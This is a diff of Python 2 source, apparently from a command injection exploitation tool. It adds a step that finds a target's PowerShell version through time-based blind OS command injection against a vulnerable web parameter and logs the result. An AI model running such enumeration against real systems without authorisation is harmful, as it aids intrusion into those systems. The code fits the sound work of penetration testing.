@@ -28,6 +28,32 @@ The "time-based" injection technique on Blind OS Command Injection.
 """
 
 """
+Powershell's version number enumeration (for Windows OS)
+"""
+def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response): 
+  cmd = settings.PS_VERSION
+  if alter_shell:
+    cmd = cmd.replace("'","\\'")
+  #Command execution results.
+  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+  # Evaluate injection results.
+  ps_version = output
+  try:
+    if float(ps_version):
+      ps_version = "".join(str(p) for p in output)
+      if menu.options.verbose:
+        print ""
+      # Output PowerShell's version number
+      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The PowerShell's version number is " + Style.UNDERLINE +  ps_version + Style.RESET_ALL + Style.BRIGHT + Style.RESET_ALL + ".\n")
+      sys.stdout.flush()
+      # Add infos to logs file. 
+      output_file = open(filename, "a")
+      output_file.write("    (!) The PowerShell's version number is " + ps_version + ".\n")
+      output_file.close()
+  except ValueError:
+    print "\n" + Fore.YELLOW + "(^) Warning: Heuristics have failed to identify PowerShell's version, which means that many attack vector may be failed." + Style.RESET_ALL 
+
+"""
 Hostname enumeration
 """
 def hostname(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
@@ -351,7 +377,13 @@ def do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_me
   else:
     settings.ENUMERATION_DONE = False
 
+  if menu.options.ps_version and settings.TARGET_OS == "win":
+    powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+    settings.ENUMERATION_DONE = True
+
   if menu.options.hostname:
+    if settings.ENUMERATION_DONE == True:
+      print ""
     hostname(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
     settings.ENUMERATION_DONE = True
 
